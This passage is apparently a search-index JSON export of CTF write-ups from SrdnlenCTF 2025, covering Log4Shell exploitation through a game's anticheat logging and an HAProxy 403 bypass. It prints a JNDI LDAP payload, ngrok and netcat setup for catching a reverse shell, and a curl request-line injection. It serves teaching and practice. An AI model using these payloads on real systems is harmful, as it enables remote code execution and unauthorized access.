        "content": "First Steps Initially, the website appears as follows: Site Presentation By entering the login credentials specified in the challenge description, we are redirected to this page: Play From here, every time I clicked on play, nothing happened; only the access number in the queue changed. For this reason, I decided to read the attached files, and the first thing that caught my eye was the log4j.properties file. From there, I realized it was using Log4j, so I went to check the installed version in the Dockerfile: RUN cd $(python -c \"import os, pyspark; print(os.path.dirname(pyspark.__file__))\")/jars && \\ rm log4j* && \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar && \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar && \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-slf4j-impl/2.14.1/log4j-slf4j-impl-2.14.1.jar && \\ wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-1.2-api/2.14.1/log4j-1.2-api-2.14.1.jar As we can see, the version is 2.14.1. Searching online, this version is vulnerable to CVE-2021-44228. Now we just need to figure out how to send the payload to exploit it. Continuing to read, I noticed in the anticheat.py file the use of spark and log4j, so I understood that the game\u2019s anticheat system needed to be triggered in some way to exploit the vulnerability: log4j_config_path = \"log4j.properties\" spark = SparkSession.builder \\ .appName(\"Anticheat\") \\ .config(\"spark.driver.extraJavaOptions\", \"-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:\" + log4j_config_path) \\ .config(\"spark.executor.extraJavaOptions\", \"-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:\" + log4j_config_path) \\ .getOrCreate() logger = spark._jvm.org.apache.log4j.LogManager.getLogger(\"Anticheat\") Continuing to read the files, I noticed that the browser and server also communicate via Socket.IO. However, if we examine the socket.py file, we see that there is no input validation. Even though our account is just a spectator, we can call any function. The handle_bird_movement function, although it uses the user ID, does not take it from cookies. It retrieves it from user-controlled input, so we can provide any ID we want, whether it belongs to a player or a spectator: def init_socket_events(socketio, players): @socketio.on('connect') @login_required def handle_connect(): user_id = int(current_user.get_id()) log_action(user_id, \"is connecting\") if user_id in players.keys(): # Player already exists, send their current position emit('connected', {'user_id': user_id, 'x': players[user_id]['x'], 'y': players[user_id]['y'], 'angle': players[user_id]['angle']}) else: # TODO: Check if the lobby is full and add the player to the queue log_action(user_id, f\"is spectating\") emit('update_bird_positions', players, broadcast=True) @socketio.on('move_bird') @login_required def handle_bird_movement(data): user_id = data.get('user_id') if user_id in players: del data['user_id'] if players[user_id] != data: with lock: players[user_id] = { 'x': data['x'], 'y': data['y'], 'color': 'black', 'angle': data.get('angle', 0) } if analyze_movement(user_id, data['x'], data['y'], data.get('angle', 0)): log_action(user_id, f\"was cheating with final position ({data['x']}, {data['y']}) and final angle: {data['angle']}\") # del players[user_id] # Remove the player from the game - we are in beta so idc emit('update_bird_positions', players, broadcast=True) @socketio.on('disconnect') @login_required def handle_disconnect(data): user_id = current_user.get_id() if user_id in players: del players[user_id] emit('update_bird_positions', players, broadcast=True) To trigger the anticheat, we still need to bypass the analyze_movement function. This function calculates whether our speed exceeds a certain threshold (the speed is calculated using other data like coordinates and timestamps). If it detects suspicious movement, it will log the attempt (inserting our payload into the logs). It also interpolates the angle property, which is never used in analyze_movement, so we can set it to whatever we want. Let\u2019s proceed with the exploit. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:4:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udd2c Vulnerability Analysis ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:5:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Potential Vulnerabilities Log4Shell \ud83c\udfaf Solution Path ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:5:1",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Exploitation Steps ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:6:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Initial setup The exploit essentially relies on sending a string like jndi:ldap://<ip>:1389/a to the server to have it written in the Log4j logs. Once this is done, we will receive a connection on our previously started server, obtaining a reverse shell. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:6:1",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Exploitation First, I set up the port forwarding, as the poc.py file that exploits the vulnerability requires 3 port forwardings: ngrok tcp 1389 ngrok http 8080 ngrok tcp 9001 The first port is where the LDAP server will be hosted, the second is for the web server where the string we send will retrieve the java exploit created by the poc.py file, and finally, the last port is used to receive the reverse shell on netcat. So, we also open a netcat session: nc -lvnp 9001 And then, I start the exploit: python poc.py --userip ngrok_link --webport 8080 --lport 9001 Once that is done, all that\u2019s left is to send the string to the server to insert it into the logs. This can be done by writing a Python script with a socket connection to the server: python exploit.py Of course, in the exploit, every time it is run, the new ldap forwarding link created with ngrok must be set. This allowed me to obtain a reverse shell, and by running cat flag.txt, I was able to retrieve the flag. \ud83d\udee0\ufe0f Exploitation Process ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:6:2",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Approach I used the following exploit. I installed openjdk-11-jdk (which is also used in the challenge), then in poc.py I replaced all the relative paths to the JDK with the names of the binaries, which are now in the PATH. I ran python3 poc.py --userip <ip> --webport 8080 --lport 9001, which starts the LDAP server on port 1389 and the HTTP server on port 8080. Then, in another terminal, I started a netcat listener on port 9001 (nc -lvnp 9001). I performed the port forwarding for the 3 ports and ran exploit.py. Another way to do this was directly via the DevTools, as we have direct access to the socket variable in DevTools. We can interact directly with the socket. To activate the anticheat, we can send two movements with a short interval, using very different coordinates: socket.emit(\"move_bird\", {\"user_id\": 1, \"x\": 0, \"y\": 0, \"angle\": \"${jndi:ldap://<ip\\>:1389/a}\"}); setTimeout(() => { socket.emit(\"move_bird\", {\"user_id\": 1, \"x\": 142142352425524, \"y\": 4322525524, \"angle\": \"${jndi:ldap://<ip\\>:1389/a}\"}) }, 2000); \u00a0Exploit \u00a0POC \ud83d\udea9 Flag Capture Flag \ud83d\udd27 Tools Used Tool Purpose Python Exploit Ngrok Port Forwarding \ud83d\udcc8 Technical Deep Dive ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:7:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Vulnerability Details Type: RCE (CVE-2021-44228) CVSS Score: 10 ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:8:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Mitigation Strategies Update to the last version of log4j. \ud83d\udca1 Key Learnings ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:9:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "New Knowledge I learned how to exploit the Log4j vulnerability through the PoC. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:10:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous \ud83d\udcda References & Resources ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:11:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Official Documentation Tool Docs Vulnerability Info ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:12:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Learning Resources https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/ https://systemoverlord.com/2022/06/20/bsidessf-2022-ctf-login4shell.html https://snyk.io/blog/fetch-the-flag-ctf-2022-writeup-logster/ https://www.youtube.com/watch?v=P8uOcQIE4Uk&ab_channel=2bitSec https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/ \ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:44 From start to flag Global Ranking (At the time of flag submission) 26/1577 Challenge ranking Points Earned 500 Team contribution Created: 19-01-2025 \u2022 Last Modified: 19-01-2025 Author: mH4ck3r0n3 \u2022 Team: Team Aetruria ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/sparkling-sky/:13:0",
        "tags": [
          "\u26a0\ufe0f CVE-2021-44228 (Log4Shell)",
          "\ud83d\udcdc Log4j",
          "\u26a0\ufe0f CVE",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Sparkling Sky",
        "uri": "/posts/2025/02/05/sparkling-sky/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Average HTTP/3 Enjoyer' from SrdnlenCTF - 2025",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": " Challenge Presentation ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:0:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event SrdlenCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 405 Out of 500 total \u2b50 Difficulty \ud83d\udfe1 Medium Personal Rating: 3/10 \ud83d\udc64 Author pysu Profile \ud83c\udfae Solves (At the time of flag submission) 23 XX% solve rate \ud83d\udcc5 Date 19-01-2025 SrdlenCTF - 2025 Day X \ud83e\uddbe Solved By aquila2 Team: Team Aetruria ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:1:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udcdd Challenge Information HTTP/3 is just the best version of HTTP, wait a few years, until setting up an HTTP/3 server will not be a pain, and you\u2019ll see. I hid a secret on /flag, you can only get it if you become a real HTTP/3 enjoyer. NOTE: This challenge uses only HTTP/3, browsers are a bit hesitant in using it by default, so you\u2019ll have to use explicit arguments to do so. In chrome you can do the following: chrome \u2013enable-quic \u2013origin-to-force-quic-on=enjoyer.challs.ctf.srdnlen.it ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:2:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:3:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Provided Files Files: \u00a0Attached Files \ud83d\udd0d Initial Analysis ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:3:1",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "First Steps After an initial analysis and some research, I tried making a request with curl using the --http3 option: curl --http3 https://enjoyer.challs.ctf.srdnlen.it Since the site was not reachable without HTTP/3 support, I proceeded to access the /flag route using curl: curl --http3 https://enjoyer.challs.ctf.srdnlen.it/flag Receiving a response with a 403 Unauthorized error: Forbidden Then I noticed that this was being blocked through the server\u2019s proxy rules: acl restricted_flag path_sub,url_dec -m sub -i i /flag http-request deny if restricted_flag Through an HAProxy proxy. So I started doing some research online to find an effective bypass for this proxy rule. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:4:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udd2c Vulnerability Analysis ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:5:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Potential Vulnerabilities 403 Bypass Proxy Rule Bypass \ud83c\udfaf Solution Path ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:5:1",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Exploitation Steps ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:6:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Initial setup After searching online, as mentioned earlier, I found the page on StackOvreflow, from which I figured out how to craft the exploit. The trick was to URL-encode the slash (/) in a special syntax, but I also tried using the --path-as-is option in curl, but it didn\u2019t work. After that, I needed to craft any header to bypass the rule. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:6:1",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Exploitation With the following exploit, I was able to obtain the flag: echo \"\\n\"; curl --insecure -X \"$(echo -en 'GET %2fflag 1/\\r\\nX-Ignore-Injection:')\" https://enjoyer.challs.ctf.srdnlen.it --http3 ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:6:2",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Flag capture Manual Flag \ud83d\udee0\ufe0f Exploitation Process ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:6:3",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Approach I wasn\u2019t able to write the automatic exploit in Python due to issues with HTTP/3. I also tried using httpx, but it didn\u2019t work. I even attempted using bash script, but without success. \u00a0None \ud83d\udea9 Flag Capture Flag ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:7:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation \ud83d\udd27 Tools Used Tool Purpose Curl Http3 request \ud83d\udca1 Key Learnings ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:8:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "New Knowledge I learned about HTTP Request Smuggling and Header Smuggling from this challenge, but in the end, it was a bypass of the proxy rules through encoding with the addition of a crafted header field. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:9:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous \ud83d\udcda References & Resources ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:10:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Learning Resources https://hacktricks.boitatech.com.br/pentesting/pentesting-web/403-and-401-bypasses https://stackoverflow.com/questions/63689649/make-an-http-request-without-a-forward-slash/76882066#76882066 \ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:30 From start to flag Global Ranking (At the time of flag submission) 22/1572 Challenge ranking Points Earned 405 Team contribution Created: 19-01-2025 \u2022 Last Modified: 19-01-2025 Author: mH4ck3r0n3 \u2022 Team: Team Aetruria ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/average-http/3-enjoyer/:11:0",
        "tags": [
          "\ud83d\udeab 403 Bypass",
          "\ud83d\udeab Proxy Rule Bypass",
          "\ud83d\udee1\ufe0f HAProxy",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Average HTTP/3 Enjoyer",
        "uri": "/posts/2025/02/05/average-http/3-enjoyer/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Focus. Speed. I Am Speed.' from SrdnlenCTF - 2025",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": " Challenge Presentation \ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event SrdlenCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 50 Out of 500 total \u2b50 Difficulty \ud83d\udfe2 Easy Personal Rating: 3/10 \ud83d\udc64 Author Octaviusss Profile \ud83c\udfae Solves (At the time of flag submission) 189 XX% solve rate \ud83d\udcc5 Date 19-01-2025 SrdlenCTF - 2025 Day X \ud83e\uddbe Solved By aquila2 Team: Team Aetruria ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:0:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udcdd Challenge Information Welcome to Radiator Springs\u2019 finest store, where every car enthusiast\u2019s dream comes true! But remember, in the world of racing, precision matters\u2014so tread carefully as you navigate this high-octane experience. Ka-chow! Website: http://speed.challs.srdnlen.it:8082 ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/focus.-speed.-i-am-speed./:1:0",
        "tags": [
          "\ud83d\udc89 NoSQL Injection",
          "\u26a1 Race Condition",
          "\ud83c\udf10 Web Security"
        ],
        "title": "\ud83c\udf10 Focus. Speed. I Am Speed.",
        "uri": "/posts/2025/02/05/focus.-speed.-i-am-speed./"
      }
    },
    {
